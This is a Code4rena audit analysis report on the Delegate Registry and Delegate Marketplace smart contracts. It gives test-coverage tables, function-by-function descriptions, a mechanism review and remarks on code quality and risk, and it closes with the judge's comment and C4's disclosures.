For this audit, 4 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-09-delegate-findings/issues/261) by **pfapostol** received the top score from the judge.

*The following wardens also submitted reports: [DadeKuma](https://github.com/code-423n4/2023-09-delegate-findings/issues/305), [m4ttm](https://github.com/code-423n4/2023-09-delegate-findings/issues/384), and [Banditx0x](https://github.com/code-423n4/2023-09-delegate-findings/issues/157).*

### Approach taken in evaluating the codebase

I first explored the scope of audit. I discovered that the project can be divided into 2 independent parts: `Delegate Registry` and `Delegate Marketplace`. I carried out all subsequent stages separately for each of this parts, and then analyzed the correctness of their interaction.

**Test coverage**

`Delegate Registry`:

Test coverage is 100% for most audit files. In this regard, I decided to concentrate on finding logical errors, since simple errors (errors due to typos, incorrect statements) should be excluded by tests.

| File                              | % Lines           | % Statements      | % Branches     | % Funcs         |
| --------------------------------- | ----------------- | ----------------- | -------------- | --------------- |
| src/DelegateRegistry.sol          | 100.00% (175/175) | 100.00% (219/219) | 98.78% (81/82) | 100.00% (33/33) |
| src/libraries/RegistryHashes.sol  | 100.00% (12/12)   | 100.00% (12/12)   | 100.00% (0/0)  | 100.00% (12/12) |
| src/libraries/RegistryOps.sol     | 66.67% (2/3)      | 66.67% (2/3)      | 100.00% (0/0)  | 66.67% (2/3)    |
| src/libraries/RegistryStorage.sol | 100.00% (6/6)     | 100.00% (6/6)     | 100.00% (0/0)  | 100.00% (3/3)   |

`Delegate Marketplace`:

| File                                             | % Lines          | % Statements      | % Branches       | % Funcs          |
|--------------------------------------------------|------------------|-------------------|------------------|------------------|
| src/CreateOfferer.sol                            | 90.70% (39/43)   | 92.00% (46/50)    | 77.27% (17/22)   | 100.00% (8/8)    |
| src/DelegateToken.sol                            | 88.55% (147/166) | 90.28% (195/216)  | 80.43% (37/46)   | 89.66% (26/29)   |
| src/PrincipalToken.sol                           | 100.00% (14/14)  | 100.00% (17/17)   | 100.00% (4/4)    | 100.00% (5/5)    |
| src/libraries/CreateOffererLib.sol               | 95.24% (40/42)   | 95.38% (62/65)    | 69.23% (18/26)   | 100.00% (9/9)    |
| src/libraries/DelegateTokenLib.sol               | 88.89% (8/9)     | 90.48% (19/21)    | 75.00% (6/8)     | 100.00% (5/5)    |
| src/libraries/DelegateTokenRegistryHelpers.sol   | 100.00% (57/57)  | 100.00% (87/87)   | 100.00% (26/26)  | 100.00% (21/21)  |
| src/libraries/DelegateTokenStorageHelpers.sol    | 91.67% (44/48)   | 92.11% (70/76)    | 80.77% (21/26)   | 100.00% (21/21)  |
| src/libraries/DelegateTokenTransferHelpers.sol   | 88.24% (30/34)   | 87.80% (36/41)    | 80.77% (21/26)   | 100.00% (9/9)    |

**Code review**

I studied the `Delegate Registry` code starting with the libraries, and also starting from the lowest level functions, moving to the top level functions. Having built a general understanding of what each of the functions does, I formed an idea of how the Registry works and built general diagrams.

**Packed delegation data:**

![2023-09-delegate-delegation-state.jpg](https://user-images.githubusercontent.com/50257230/267004960-285bf761-0dd8-47bf-b3c2-84971c8b0ab4.jpg)

**Important external interfaces:**

1. delegateAll - Delegates the entire wallet
2. delegateContract - Delegates the right to use the contract
3. delegateERC721 - Delegates the right to use a specific contract token
4. delegateERC20 - Delegates the right to use a certain amount of a token of a certain contract
5. delegateERC1155 - Delegates the right to use a certain amount of a certain token of a certain contract

There are also 5 functions to check the correctness of the delegation

<details>
  <summary>Details on each function and hashing schemes</summary>
  
`RegistryOps` library:

1. Contains 3 operation:
    1. `max`: use optimized assembly logic to calculate max of 2 numbers
    2. `and`: use 2x `iszero` to clean arguments before `and`
    3. `or`: use 2x `iszero` to clean arguments before `or`
    
`RegistryStorage` library:

1. Contains 10 constants:
    1. mostly offsets for packing/unpacking of addresses
2. Contains 3 functions:
    1. `packAddresses`: - store `from`, `to` and `contract` addresses in 2 storage slots
    2. `unpackAddresses`: - reverse to `packAddresses` operation
    3. `unpackAddress`: - helper to unpack `to` or `from`. Should not to be used for `contract` unwrapping

`RegistryHashes` library:

1. Contains 7 constants:
    1. mostly types of hashes
2. Contains 12 functions:
    1. `decodeType`: - decode hash type from last byte into `enum`, (potentially may overflow `enum`)
    2. `location`: - calculate storage key from hash
        
        ![2023-09-delegate-location.jpg](https://user-images.githubusercontent.com/50257230/267005098-69e33a94-3981-4fe4-9132-bff4b01fe6d6.jpg)
        
    3. `allHash`: - calculate hash for `all` type
        
        ![2023-09-delegate-all-hash.jpg](https://user-images.githubusercontent.com/50257230/267005120-2c0f64f1-9956-4831-9aa5-94b5db62eae3.jpg)
        
    4. `allLocation`: - calculate location for `all` type hash
        
        ![2023-09-delegate-all-hash-location.jpg](https://user-images.githubusercontent.com/50257230/267005108-f66df89c-bb88-4cfc-bd86-d2e207368f0a.jpg)
        
    5. `contractHash` : - similar to `allHash`
    6. `contractLocation`: - similar to `allLocation`
    7. `erc721Hash`: - similar to `allHash`
    8. `erc721Location`: - similar to `allLocation`
    9. `erc20Hash`: - similar to `allHash`
    10. `erc20Location`: - similar to `allLocation`
    11. `erc1155Hash`: - similar to `allHash`
    12. `erc1155Location`: - similar to `allLocation`

`DelegateRegistry` contract:

1. contains 3 state variables:
    1. `delegations`
    2. `outgoingDelegationHashes`
    3. `incomingDelegationHashes`
2. contains 33 functions:
    1. `sweep`: - transfer all contract balance to hardcoded address (Currently 0x0)
    2. `readSlot`: - perform `sload`
    3. `readSlots`: - perform `sload`s in loop
    4. `_pushDelegationHashes`: - *push delegation hash to the incoming and outgoing hashes mappings*
    5. `_writeDelegation` x2 : - perform `sstore` for `data` at `position` in `location`
    6. `_updateFrom`: - change `from` value in first slot, while keeping first 8 bytes of `contract` intact
    7. `_loadDelegationBytes32`: - perform `sload` at `position` in `location`
    8. `_loadDelegationUint`: - similar to `_loadDelegationBytes32`
    9. `multicall`: - payable multicall
    10. `supportsInterface`: -
    11. `_writeDelegationAddresses`: - `sstore` packed delegation at 0 and 1 slot in `location`
    12. `_loadFrom`: - `sload` `from` address from `location`
    13. `_loadDelegationAddresses`: - reverse to `_writeDelegationAddresses`
    14. `_invalidFrom`: - check if address is *`DELEGATION_EMPTY` or `DELEGATION_REVOKED` flags(addresses)*
    15. `_validateFrom`: - match passed `from` to value in `location`
    16. `checkDelegateForAll`: - validate that `from` delegated `to` the entire wallet
    17. `checkDelegateForContract`: - the same as `checkDelegateForContract` or delegated for specific `contract`
    18. `checkDelegateForERC721` : - the same as `checkDelegateForContract` or delegated for specific `tokenId` in specific `contract`
    19. `checkDelegateForERC20`: - return amount delegated `from` to `to` 
    20. `checkDelegateForERC1155` : - similar to `checkDelegateForERC20`
    21. `_getValidDelegationHashesFromHashes`: - remove invalid `from`s from hashes array
    22. `getIncomingDelegationHashes`: - return only valid hashes from `incomingDelegationHashes`
    23. `getOutgoingDelegationHashes`: - the same as `getIncomingDelegationHashes`, but  with `outgoingDelegationHashes`
    24. `_getValidDelegationsFromHashes`: - read storage for every valid hash in memory `Delegation` struct
    25. `getIncomingDelegations`: - return `Delegation` struct for only valid hashes from `incomingDelegationHashes`
    26. `getOutgoingDelegations`: - the same as `getIncomingDelegations`, but  with `outgoingDelegationHashes`
    27. `getDelegationsFromHashes`: - the same as `_getValidDelegationsFromHashes` but for invalid delegation return empty struct
    28. `delegateAll`: - `msg.sender` delegate the whole wallet to `from`
        
        ![2023-09-delegate-delegate-all-flow.jpg](https://user-images.githubusercontent.com/50257230/267005089-e7b3823d-d232-4180-91fd-2a94083b7d03.jpg)
        
    29. `delegateContract`: - similar to `delegateAll`, but for specific `contract`
    30. `delegateERC721`: - similar to `delegateContract`, but for specific `tokenId`
    31. `delegateERC20`: - similar to `delegateContract`, but for `ERC20` token `amount` + allow to change `amount` if already delegated
    32. `delegateERC1155`: - similar to `delegateERC20`, but for `ERC1155` (specific `tokenId`)
  
</details>

`Delegate Marketplace`:

`CreateOfferer` is a separate part of the marketplace that guarantees interaction with the seaport.

**Important external interfaces:**

1. create - Create `DelegateToken` and `PrincipalToken` tokens. Transfer one of token types to contract. Delegate to `delegateHolder``. mint principal token.
2. extend - Extend the expiration time for an existing `DelegateToken`. Called by `PrincipalToken` owner.
3. rescind - Return the `DelegateToken` to the `PrincipalToken` holder early. Called by `DelegateToken` holder or after the `DelegateToken` has expired, anyone can call this method. this does not release the spot asset from escrow, it merely cancels out the `DelegateToken`.
4. withdraw - burn the `PrincipalToken` and claim the spot asset from escrow. Called by the `PrincipalToken` owner. `PrincipalToken` owner can authorize others to call this on their behalf, and if `PrincipalToken` owner also owns the `DelegateToken` then they can skip calling rescind and go straight to withdraw

<details>
  <summary>Details for each function</summary>
  
### Delegate marketplace

`DelegateTokenStorageHelpers` library:

1. Contains 10 constants:
    1. mostly flags and storage positions
2. Contains 21 functions:
    1. `writeApproved`: - store `approved` to *`PACKED_INFO_POSITION*` while keeping `expiry` intact
    2. `writeExpiry`: - store `expiry` to *`PACKED_INFO_POSITION*` while keeping `approved` intact
    3. `writeRegistryHash`: - store `registryHash` to *`REGISTRY_HASH_POSITION`*
    4. `writeUnderlyingAmount`: - store `underlyingAmount` to *`UNDERLYING_AMOUNT_POSITION`*
    5. `incrementBalance`: - increment `balance` for `delegateTokenHolder`
    6. `decrementBalance`: - decrement `balance` for `delegateTokenHolder`
    7. `principalIsCaller`: - revert if `msg.sender` is not `principalToken`
    8. `revertAlreadyExisted`: - revert if `registryHash` is not zero
    9. `revertNotOperator`: - revert if not `operator` or “owner”
    10. `readApproved`: - shift *`PACKED_INFO_POSITION` to read `approved`*
    11. `readExpiry`: - read `expiry` from *`PACKED_INFO_POSITION`* 
    12. `readRegistryHash`: - read `registryHash` from *`REGISTRY_HASH_POSITION`*
    13. `readUnderlyingAmount`: - read `underlyingAmount` from *`UNDERLYING_AMOUNT_POSITION`*
    14. `revertNotMinted`: - revert if `registryHash` is not set or used (*`ID_AVAILABLE`, `ID_USED`*)
    15. `checkBurnAuthorized`: - revert if caller is not `principalToken` or delegate not authorized burn 
    16. `checkMintAuthorized`: - similar to `checkBurnAuthorized` but with mint
    17. `revertNotApprovedOrOperator`: - revert if caller is not “owner” or `operator` or `approved` in token
    18. `revertInvalidWithdrawalConditions`: - similar to `revertNotApprovedOrOperator` + check expiry
    19. `burnPrincipal` : - call `burn` on `PrincipalToken` with custom reentrancy guard
    20. `mintPrincipal`: - call `mint` on `PrincipalToken` with custom reentrancy guard

`DelegateTokenRegistryHelpers` library:

1. Contains 21 functions:
    1. `loadTokenHolder`: - read `to` from `delegateRegistry` at `location` from `registryHash`. Not revert on revoked!!!
    2. `loadContract`: - read `contract` from `delegateRegistry` at `location` from `registryHash`
    3. `loadTokenHolderAndContract`: - read `to` and `contract` from `delegateRegistry` at `location` from `registryHash`
    4. `loadFrom`: - similar with `from`
    5. `loadAmount`: - similar with `amount`
    6. `loadRights`: - similar with `rights`
    7. `loadTokenId`: - similar with `tokenId`
    8. `calculateDecreasedAmount`: - return `amount` - `decreaseAmount`. No underflow check!!!
    9. `calculateIncreasedAmount`: - similar to `calculateDecreasedAmount` ,but increased
    10. `transferERC721`: - revoke delegation to `from` and delegate `to` while validating both hashes
    11. `revokeERC721`: - revoke delegation and validate hash
    12. `delegateERC721`: - delegate and validate hash
    13. `revertERC721FlashUnavailable`: - revert if `contract` does not have `rights` for `flashloan` or `tokenId` itself
    14. `revertERC20FlashAmountUnavailable`: - revert if delegation does not have enough `amount` with `“”` and `flashloan` `rights`
    15. `revertERC1155FlashAmountUnavailable`: - similar to `revertERC20FlashAmountUnavailable`
    16. `transferERC20`: - decrease `amount` from old delegation and increase for new
    17. `transferERC1155`: - similar to `transferERC20`
    18. `incrementERC20`: - increase amount in delegation
    19. `incrementERC1155`: - the same with `ERC1155`
    20. `decrementERC20`: - similar to `incrementERC20`, but decrease
    21. `decrementERC1155`: - similar to `incrementERC1155`, but decrease

`DelegateTokenTransferHelpers` library:

1. Contains 2 constants:
    1. `ERC1155` callbacks
2. Contains 9 functions:
    1. `checkERC1155BeforePull` : - custom reentrancy guard + revert if amount == 0 
    2. `checkERC1155Pulled`:- bottom part of custom reentrancy guard + require contract to be operator
    3. `revertInvalidERC1155PullCheck`: - revert on `checkERC1155Pulled` condition
    4. `pullERC1155AfterCheck`: - transfer `ERC1155` from `msg.sender` to contract revert if *`ERC1155_PULLED`*
    5. `checkERC20BeforePull`: - check that it is `ERC20` check that `amount` ≠ 0, check that there is enough `allowance`
    6. `pullERC20AfterCheck`: - transfer `ERC20` from `msg.sender` to contract
    7. `checkERC721BeforePull`: - check that it is `ERC721`, check that owner is `msg.sender`
    8. `pullERC721AfterCheck`: - transfer `ERC721` from `msg.sender` to contract
    9. `checkAndPullByType`: - transfer one of token types from `msg.sender` to contract
    
`DelegateTokenHelpers` library:

1. Contains 5 functions:
    1. `revertOnCallingInvalidFlashloan`: - revert if selector does not match
    2. `revertOnInvalidERC721ReceiverCallback`: - the same
    3. `revertOnInvalidERC721ReceiverCallback`: - the same
    4. `revertOldExpiry`: - revert if `expiry` expired
    5. `delegateIdNoRevert`: - hash `caller` and `salt`
    
`DelegateToken` contract:

1. Contains 29 functions:
    1. `supportsInterface`: - supported interfaces
    2. `onERC1155BatchReceived`: - revert 
    3. `onERC721Received`: - revert if contract is not `operator`, else return selector
    4. `onERC1155Received`: - revert on custom reentrancy check fail else return selector
    5. `balanceOf`: - get balance of `delegateTokenHolder` if not `address(0)`
    6. `ownerOf`: - return `to` from registry for specific `delegateTokenId`
    7. `getApproved`: - return `approved` address revert if not minted
    8. `isApprovedForAll`: - return if  `accountOperator`
    9. `approve`: - store approved `spender`, revert if not minted or not operator
    10. `setApprovalForAll`: - set `accountOperator`
    11. `name`: - constant
    12. `symbol`: - constant
    13. `transferFrom`: - transfer `delegateTokenId` with underlying token
    14. `isApprovedOrOwner`: - check if it is `“owner"`or `operator` or `approved`
    15. `getDelegateId`: - get `delegateTokenId` revert if not available
    16. `burnAuthorizedCallback`: -  revert if caller is not `principalToken` or delegate not authorized burn 
    17. `mintAuthorizedCallback`: - similar
    18. `create`: - transfer one of token types to contract. delegate to `delegateHolder`. mint principal token
    19. `safeTransferFrom`: - call `transferFrom` and check selector callback
    20. `getDelegateInfo`: - build and get `DelegateInfo` from `delegateTokenId`
    21. `extend`: - allow principal or operator  to increase `expiry` if old not expired
    22. `rescind`: - allow delegate( or anyone after expiry) transfer `delegateTokenId` to principal
    23. `tokenURI`: - call `MarketMetadata` for `delegateTokenURI`
    24. `baseURI`: -  call `MarketMetadata` for `delegateTokenBaseURI`
    25. `contractURI`: - call `MarketMetadata` for `delegateTokenContractURI`
    26. `royaltyInfo`: - similar
    27. `withdraw`: - withdraw delegation, burn principal, transfer underlaying back to `msg.sender`
    28. `flashloan`: - flash-loan operation for all token types
    
`PrincipalToken` contract:

1. Contains 5 functions:
    1. `isApprovedOrOwner` : - Call `ERC721`  `_isApprovedOrOwner`
    2. `_checkDelegateTokenCaller`: - check caller is `delegateToken`
    3. `tokenURI`: - Call `MarketMetadata` for `principalTokenURI`
    4. `mint`: - mint. Called by `delegateToken` when authorized
    5. `burn`: - burn. Called by `delegateToken` when authorized

`CreateOffererModifiers` library:

1. store `seaport` address and Stage
2. Contains 2 modifiers:
    1. `onlySeaport`: - caller is `seaport`
    2. `checkStage`: - reentrancy check + stage change

`CreateOffererHelpers` library:

1. Contains 9 functions:
    1. `processNonce`: - check nonce and increment if correct
    2. `updateTransientState`: - fulfill `TransientState` struct
    3. `createAndValidateDelegateTokenId`: - Call `create` on `IDelegateToken`. And check correct `delegateId`
    4. `calculateExpiry`: - return absolute `expiry` for both types
    5. `processSpentItems`: - build `offer` and `consideration` from `minimumReceived` and `maximumSpent`
    6. `calculateOrderHash`: - hash `order` with with `tokenType`
    7. `calculateOrderHashAndId`: - get `delegateTokenId` from `calculateOrderHash`
    8. `verifyCreate`: - match hash to context
    9. `validateCreateOrderHash`: - match provided hash to actual

`CreateOfferer` contract:

1. Seaport iteraction
  
</details>

### Mechanism review

The contract consists of 2 parts, one part is a storage of delegation hashes, and the other part is ERC721 compatible tokens that reflect the ownership of the delegation.

`Delegate Registry`: uses hashing to compactly store the delegation. And also hash functions for calculating a unique location in storage. It also contains functions that check the hash based on the location and `from` address.

`Delegate Token`: Deposits all assets, in return issues an ERC721 token, which confirms the ownership of the delegation, for a certain period of time.

`PrincipalToken`: Depends on `Delegate Token`, cannot be called on its own. It is an ERC721 token that confirms the right to claim deposited assets after expiration.

`CreateOfferer`: Integration with seaport as specified in [documentation](https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#contract-orders). When selling, the asset turns into a `Delegate Token` and is assigned to the buyer, the seller receives a `PrincipalToken`.

`Delegate Token` in its work relies entirely on `Delegate Registry`, which must reliably guarantee the authenticity and confirmation of the delegation.

### Codebase quality analysis

In general, the quality of the code base is quite high. The huge number of comments in NatSpec makes it very easy to determine what a particular function is intended for.

The downside is the use of assembler for gas optimization, which is not comparable to the damage it causes to code readability.

### Centralization risks

There is no risk of centralization since all rights are divided between the `Delegate Token` and the `PrincipalToken`. The only exception is `CreateOfferer`, which relies on the `seaport` address, which is immutable, but it is possible that the contract address will change in the future, it would be useful to add a function that allows you to change the address if necessary

### Systemic risks

The contract is used to delegate all types of tokens (`ERC20`, `ERC721`, `ERC1155`), but does not take into account that some tokens do not follow the standards.

Contracts are programmed for version ^0.8.21, by default the compiler will use version 0.8.21, which is very recent and may contain undetected vulnerabilities, as well as compatibility problems with different L2 chains.

### New insights and learning from this audit

I learned about `CreateOfferer` seaport integration, all other concepts were well known to me.

**Time spent**<br>
33 hours

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-09-delegate-findings/issues/261#issuecomment-1732610672):**
 > Imo proper way to discuss coverage<br>
> +<br>
> Interesting charts for packing and logic on delegation



***


# Disclosures

C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
